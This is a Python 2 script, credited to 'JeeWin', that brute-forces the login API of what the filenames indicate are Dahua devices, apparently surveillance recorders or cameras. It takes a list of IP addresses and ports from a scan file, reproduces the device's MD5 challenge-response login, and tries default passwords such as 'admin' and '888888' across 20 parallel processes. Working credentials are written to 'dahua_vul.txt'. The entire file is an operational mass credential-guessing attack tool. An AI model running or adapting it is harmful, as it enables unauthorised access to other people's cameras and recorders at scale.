#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'JeeWin'

import hashlib
import requests
import json
import sys
from multiprocessing import Pool

def brute_force(ip_port):
    ip = ip_port[0]
    port = ip_port[1]
    url = 'http://' + ip + ':' + port + '/RPC2_Login'
    usernames = ['admin', '666666']
    passwords = ['admin', '666666', '888888', '123456',  '12345', '111111']
    # passwords = []
    # for line in open(sys.argv[2]):
    #     line = line.strip('\n')
    #     passwords.append(line)
    for username in usernames:
        for password in passwords:
            try:
                r = requests.post(url, timeout = 3, data = json.dumps({"method":"global.login","params":{"userName":"admin","password":"","clientType":"Web3.0"},"id":10000}))
                if r.status_code == 200:
                    res = json.loads(r.content)

                    #username = '666666'
                    realm = res['params']['realm']
                    random = res['params']['random']

                    m = hashlib.md5()
                    m.update(username + ":" + realm + ":" + password)
                    md5 = username + ":" + random + ":" + m.hexdigest().upper()
                    m = hashlib.md5()
                    m.update(md5)

                    params = {"clientType":"Web3.0"}
                    params['userName'] = username
                    params['password'] = m.hexdigest().upper()

                    payload = {"method":"global.login","params":params,"id":10000}
                    payload['session'] = res['session']
                    #print payload

                    r = requests.post(url, timeout = 3, data = json.dumps(payload))

                    print url, username, password, r.content # ,json.loads(r.content)['result']
                    f = open('dahua.txt','a')
                    f.write(url + ':' + username + ':' + password)
                    f.write(r.content)
                    f.close()
                    if str(json.loads(r.content)['result']) == 'True':
                        #{ "id" : 10000, "params" : null, "result" : true, "session" : 536954624 }
                        print url + ' have vul:', username, ':', password
                        f = open('dahua_vul.txt', 'a')
                        f.write(url + ' have vul:' + username + ':' + password + '\n')
                        f.close()
                        break
                    elif str(json.loads(r.content)['error']['code']) <> '401': # locked
                        break

            except Exception, e:
                print 'other error:', e
                break
def main():
    urls = []
    for line in open(sys.argv[1]):
        line = line.strip('\n')
        if not line.split(',')[0] == "saddr":
            urls.append(line.split(','))
    #brute_force(['10.233.200.208','80'])

    pool = Pool(20)
    pool.map(brute_force, urls)
    pool.close()
    pool.join()

if __name__ == "__main__":
    main()









